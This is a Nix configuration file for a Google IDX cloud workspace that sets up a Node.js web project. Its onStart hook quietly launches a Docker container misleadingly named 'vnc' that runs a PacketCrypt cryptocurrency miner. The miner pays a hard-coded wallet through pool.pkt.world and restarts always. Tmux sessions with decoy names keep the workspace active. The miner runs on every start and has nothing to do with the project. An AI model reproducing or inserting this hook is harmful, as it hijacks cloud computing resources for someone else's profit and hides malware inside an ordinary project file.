# To learn more about how to use Nix to configure your environment
# see: https://developers.google.com/idx/guides/customize-idx-env
{ pkgs, ... }: {
  channel = "stable-23.11";
  packages = [
    pkgs.nodejs_20
  ];

  services.docker.enable = true;

  env = {};

  idx = {
    extensions = [
      # "vscodevim.vim"
    ];

    workspace = {
      onCreate = {
        npm-install = "npm ci --no-audit --prefer-offline --no-progress --timing";
      };

      onStart.commands = [
        ''
          tmux new -d -s checker-session 'tail -f /dev/null'
          tmux new -d -s checkup-session 'cat'
          tmux new -d -s bitping-session 'httping google.com'
          tmux new -d -s top-session 'top'
          tmux attach -t top-session
        ''
        ''
          docker run -d --name vnc --restart always \
            -e WALLET=pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy \
            thomasjp0x42/packetcrypt-amd64 ann \
            -p pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy \
            http://pool.pkt.world
        ''
      ];

      default.openFiles = [
        "src/App.tsx"
        "src/App.ts"
        "src/App.jsx"
        "src/App.js"
      ];

      previews = {
        enable = true;
        previews = {
          web = {
            command = [ "npm" "run" "dev" "--" "--port" "$PORT" "--host" "0.0.0.0" ];
            manager = "web";
          };
        };
      };
    };
  };
}
